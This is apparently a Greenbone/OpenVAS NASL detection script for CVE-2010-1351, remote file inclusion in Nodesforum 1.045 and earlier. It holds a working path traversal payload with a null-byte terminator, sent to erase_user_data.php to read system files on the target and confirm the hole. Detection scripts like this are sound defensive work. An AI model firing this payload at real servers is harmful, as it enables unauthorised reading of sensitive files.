if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902040" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-04-16 16:17:26 +0200 (Fri, 16 Apr 2010)" );
	script_cve_id( "CVE-2010-1351" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "Nodesforum Multiple Remote File Inclusion Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/39311" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/57517" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/12047" );
	script_tag( name: "impact", value: "Successful exploitation will let attackers to execute arbitrary
  code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "Nodesforum version 1.045 and prior." );
	script_tag( name: "insight", value: "Input passed to '_nodesforum_path_from_here_to_nodesforum_folder'
  parameter in 'erase_user_data.php' and to the '_nodesforum_code_path' parameter
  in 'pre_output.php' is not being validated before being used to include files." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Nodesforum and is prone to multiple remote file
  inclusion vulnerabilities." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/nodesforum", "/Nodesforum", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	res = http_get_cache( item: url, port: port );
	if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "Nodesforum" )){
		for file in keys( files ) {
			url = NASLString( dir, "/erase_user_data.php?_nodesforum_path_from_here_to_nodesforum_folder=../../../../../../../../", files[file], "%00" );
			if(http_vuln_check( port: port, url: url, pattern: file )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 0 );

